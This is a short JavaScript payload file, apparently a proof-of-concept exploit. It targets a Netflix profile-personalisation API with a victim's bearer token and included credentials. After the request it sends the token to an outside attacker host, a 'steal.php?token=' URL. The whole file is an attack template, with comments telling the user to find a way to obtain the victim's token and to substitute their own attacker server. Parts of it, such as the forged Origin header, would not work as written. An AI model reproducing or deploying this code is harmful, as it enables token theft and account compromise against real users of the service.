// attacker-site/payload.js

// Replace with the victim's token (you'll need to find a way to get it)
const victimToken = 'YOUR_VICTIMS_TOKEN';

// Replace with the vulnerable API endpoint
const apiEndpoint = 'https://capi.netflix.com/gateway/v3/users/profiles/66382103/personalization/experience/selections';

// Replace with your attacker's server to receive the data
const attackerServer = 'https://abdullahxxmone.github.io/attacker-server-/steal.php?token=';

fetch(apiEndpoint, {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer ' + victimToken,
        'Content-Type': 'application/json',
        'Origin': 'https://abdullahxxmone.github.io/attacker-site' // Important: Use your attacker's domain
    },
    credentials: 'include',
    body: JSON.stringify({
        // Your API request body (if needed)
    })
})
.then(response => response.json())
.then(data => {
    // Send the data (including the token) to your server
    fetch(attackerServer + victimToken);
})
.catch(error => {
    console.error('Error:', error);
});
